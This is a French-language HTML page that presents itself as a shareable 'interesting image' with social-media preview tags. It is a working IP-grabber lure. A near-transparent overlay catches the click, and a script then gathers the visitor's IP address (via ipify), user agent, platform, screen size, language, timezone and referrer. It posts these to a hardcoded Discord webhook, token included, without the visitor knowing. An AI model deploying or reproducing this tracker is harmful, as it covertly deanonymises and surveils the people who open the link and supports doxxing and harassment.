<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image</title>
    
    <meta property="og:title" content="Image intéressante">
    <meta property="og:image" content="https://picsum.photos/seed/tracker/1200/800.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="800">
    <meta property="og:description" content="Découvrez cette image magnifique">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://ton-username.github.io/ton-repo/">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Image intéressante">
    <meta name="twitter:description" content="Découvrez cette image magnifique">
    <meta name="twitter:image" content="https://picsum.photos/seed/tracker/1200/800.jpg">
    
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .image-container {
            position: relative;
            max-width: 100%;
            max-height: 100vh;
        }
        img {
            max-width: 100%;
            max-height: 100vh;
            display: block;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.01);
            z-index: 10;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="https://picsum.photos/seed/tracker/1200/800.jpg" alt="Image">
        <div class="overlay" onclick="trackClick()"></div>
    </div>
    
    <script>
        function trackClick() {
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const platform = navigator.platform;
            const screenResolution = `${screen.width}x${screen.height}`;
            const referer = document.referrer || "Accès direct";
            const timestamp = new Date().toISOString();
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    sendToDiscord(ip, userAgent, language, platform, screenResolution, referer, timestamp, timezone);
                })
                .catch(error => {
                    console.error('Erreur lors de la récupération de l\'IP:', error);
                    sendToDiscord("inconnue", userAgent, language, platform, screenResolution, referer, timestamp, timezone);
                });
        }
        
        function sendToDiscord(ip, userAgent, language, platform, screenResolution, referer, timestamp, timezone) {
            const webhookUrl = "https://discord.com/api/webhooks/1506765844166873200/hw2mE5yGAGATPIlxXgAwMkmlDV7hT9BKuFScjkBH4sbCNRGsAvIsN51mW8iYonjQQKbc";
            
            const embed = {
                title: "New click on your track image",
                color: 5814783,
                thumbnail: {
                    url: "https://picsum.photos/seed/tracker/1200/800.jpg"
                },
                fields: [
                    { name: "IP Adress", value: ip, inline: true },
                    { name: "Platform", value: platform, inline: true },
                    { name: "Screen Res", value: screenResolution, inline: true },
                    { name: "Language", value: language, inline: true },
                    { name: "TimeZone", value: timezone, inline: true },
                    { name: "Referer", value: referer, inline: false },
                    { name: "User agent", value: userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : ""), inline: false }
                ],
                footer: {
                    text: `Date: ${timestamp}`
                }
            };
            
            const payload = {
                username: "Image Tracker",
                avatar_url: "https://picsum.photos/seed/tracker/1200/800.jpg",
                content: "Someone click on your track image",
                embeds: [embed]
            };
            
            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Error when send webhook discord :', response.statusText);
                } else {
                    console.log('Info send correctly');
                }
            })
            .catch(error => {
                console.error('Error network:', error);
            });
        }
    </script>
</body>
</html>
